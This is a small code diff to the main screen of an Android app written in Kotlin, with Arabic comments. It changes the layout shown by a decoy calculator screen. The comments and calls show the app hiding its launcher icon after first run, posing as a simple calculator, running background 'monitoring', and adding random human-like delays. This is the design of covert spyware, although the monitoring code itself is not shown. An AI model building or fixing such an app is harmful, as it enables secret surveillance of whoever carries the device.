@@ -44,6 +44,7 @@ import kotlin.random.Random
  * ✅ تم إخفاء الأيقونة من درج التطبيقات.
  * ✅ تم تشغيل الخدمة والمراقبة في الخلفية.
  * ✅ تم إضافة تأخيرات بشرية عشوائية.
+ * ✅ تم إصلاح مرجع التخطيط إلى activity_main.
  */
 class MainActivity : AppCompatActivity() {
 
@@ -84,8 +85,8 @@ class MainActivity : AppCompatActivity() {
         // ✅ إخفاء أيقونة التطبيق من درج التطبيقات بعد التشغيل الأول
         disableLauncherIcon()
 
-        // ✅ عرض واجهة وهمية (آلة حاسبة بسيطة)
-        setContentView(R.layout.activity_dummy_calculator)
+        // ✅ عرض واجهة وهمية (آلة حاسبة بسيطة) - إصلاح المرجع إلى activity_main
+        setContentView(R.layout.activity_main)
 
         // ربط عناصر الواجهة الوهمية
         tvDisplay = findViewById(R.id.tvDisplay)
